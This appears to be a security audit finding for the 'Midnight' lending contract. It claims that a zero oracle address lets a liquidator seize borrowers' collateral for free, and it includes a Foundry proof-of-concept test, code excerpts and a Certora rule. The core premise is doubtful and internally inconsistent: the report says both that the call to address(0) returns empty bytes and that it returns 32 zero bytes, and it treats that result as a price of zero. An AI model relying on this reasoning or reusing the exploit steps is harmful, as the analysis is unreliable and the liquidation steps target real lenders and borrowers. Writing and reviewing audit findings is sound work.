### Title
Missing oracle address validation in `touchMarket` allows `address(0)` oracle, making any borrower immediately liquidatable for free - (`src/Midnight.sol` / `src/periphery/interfaces/IMidnightBundles.sol`)

### Summary
`touchMarket` validates collateral token addresses, LLTV tiers, maxLif values, and maturity bounds, but performs no check that `collateralParams[i].oracle != address(0)`. An unprivileged market creator can register a market with a zero oracle. Because a Solidity high-level call to `address(0)` returns empty bytes decoded as `uint256(0)`, every borrower in that market is immediately unhealthy and their collateral can be seized for zero repayment.

### Finding Description
**Code path:**

`touchMarket` (validation loop, `src/Midnight.sol`): iterates `collateralParams`, checks `token` sorting/uniqueness, `lltv` allowlist, `maxLif` allowlist, and maturity bound. No check on `collateralParam.oracle`.

`isHealthy` (`src/Midnight.sol` lines 944–960):
```solidity
uint256 price = IOracle(collateralParam.oracle).price();
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
```
With `oracle = address(0)`, the EVM CALL to a codeless address succeeds, returns 32 zero bytes, Solidity decodes `price = 0`, so `maxDebt += 0`. If this is the only activated collateral, `maxDebt = 0 < debt`, and `isHealthy` returns `false`.

`liquidate` (`src/Midnight.sol` lines 607–618): same oracle call sets `liquidatedCollatPrice = 0`. Then at lines 649–651:
```solidity
repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE).mulDivUp(WAD, lif);
// = seizedAssets.mulDivUp(0, 1e36).mulDivUp(WAD, lif) = 0
```
The liquidator passes `seizedAssets = borrower's full collateral, repaidUnits = 0`, seizes everything, repays nothing. The entire debt becomes `badDebt` (since `price = 0` means `badDebt` is never reduced), socialized among lenders.

**Attacker inputs:** `collateralParams[0].oracle = address(0)`, valid `token`, valid `lltv`, valid `maxLif`, valid `maturity`.

**Why checks fail:** The Certora invariant `createdMarketsHaveNonZeroCollaterals` proves `token != 0` but there is no corresponding invariant or runtime check for `oracle != 0`. The `CollateralParamsNotSorted` check only compares `token` fields. Oracle is never validated.

### Impact Explanation
Any borrower who supplies collateral and borrows in a market with `oracle = address(0)` is immediately liquidatable. A liquidator can call `liquidate(market, 0, borrower_collateral_amount, 0, borrower, false, attacker, address(0), "")` and receive the full collateral balance while repaying zero loan units. The borrower's entire debt is then socialized as bad debt among lenders, slashing their credit. This violates the core invariant: "healthy positions are not liquidatable" and "collateral cannot be seized outside health/liquidation rules."

### Likelihood Explanation
Market creation is fully permissionless — any address can call `touchMarket`. The attacker only needs to deploy a market with `oracle = address(0)` and attract one borrower (e.g., via a front-end, aggregator, or by being the borrower themselves in a griefing scenario against lenders). The attack is repeatable across any number of markets and requires no special privileges, no oracle manipulation, and no reentrancy.

### Recommendation
Add an explicit check in `touchMarket`'s collateral validation loop:
```solidity
require(collateralParam.oracle != address(0), InvalidOracle());
```
This mirrors the existing `token != address(0)` invariant already proved by Certora and should be enforced at the Solidity level symmetrically.

### Proof of Concept

function testOracleZeroExploit() public {
    // 1. Attacker creates market with oracle = address(0)
    CollateralParams[] memory params = new CollateralParams[](1);
    params[0] = CollateralParams({
        token: address(collateralToken1),
        lltv: 0.77e18,
        maxLif: maxLif(0.77e18, 0.25e18),
        oracle: address(0)          // <-- zero oracle, no validation
    });
    Market memory badMarket;
    badMarket.loanToken = address(loanToken);
    badMarket.maturity = block.timestamp + 100;
    badMarket.collateralParams = params;

    // Assert: touchMarket succeeds (no revert) — demonstrates missing check
    midnight.touchMarket(badMarket);

    // 2. Borrower supplies collateral and borrows (oracle not called on supply)
    collateralize(badMarket, borrower, 1e18);
    setupMarket(badMarket, 1e18); // borrower takes debt

    // 3. isHealthy returns false immediately
    bool healthy = midnight.isHealthy(badMarket, toId(badMarket), borrower);
    assertFalse(healthy, "borrower should be unhealthy due to zero oracle");

    // 4. Liquidator seizes all collateral for free
    uint256 collateralBefore = midnight.collateral(toId(badMarket), borrower, 0);
    uint256 attackerBalanceBefore = collateralToken1.balanceOf(attacker);

    vm.prank(attacker);
    midnight.liquidate(badMarket, 0, collateralBefore, 0, borrower, false, attacker, address(0), "");

    assertEq(collateralToken1.balanceOf(attacker), attackerBalanceBefore + collateralBefore,
        "attacker seized all collateral");
    assertEq(midnight.collateral(toId(badMarket), borrower, 0), 0,
        "borrower has no collateral left");
    // Debt remains (socialized as bad debt among lenders)
    assertGt(midnight.debtOf(toId(badMarket), borrower), 0,
        "debt socialized, not repaid");
}

    function isHealthy(Market memory market, bytes32 id, address borrower) public view returns (bool) {
        Position storage _position = position[id][borrower];
        uint256 debt = _position.debt;
        uint256 maxDebt;
        if (debt > 0) {
            uint128 _collateralBitmap = _position.collateralBitmap;
            while (_collateralBitmap != 0) {
                uint256 i = UtilsLib.msb(_collateralBitmap);
                CollateralParams memory collateralParam = market.collateralParams[i];
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
                _collateralBitmap = _collateralBitmap.clearBit(i);
            }
        }
        return maxDebt >= debt;
    }

/// If all oracles return 0 and the borrower has debt, isHealthy returns false.
rule oracleZeroCausesIsHealthyReturnFalse(env e, Midnight.Market market, address borrower) {
    require forceOracleReturnZero, "all oracles return zero";

    bytes32 id = summaryToId(market);
    require collateralBitmap(id, borrower) != 0, "borrower has activated collaterals";

    bool healthy = isHealthy(e, market, id, borrower);

    assert debtOf(id, borrower) > 0 => !healthy;
}
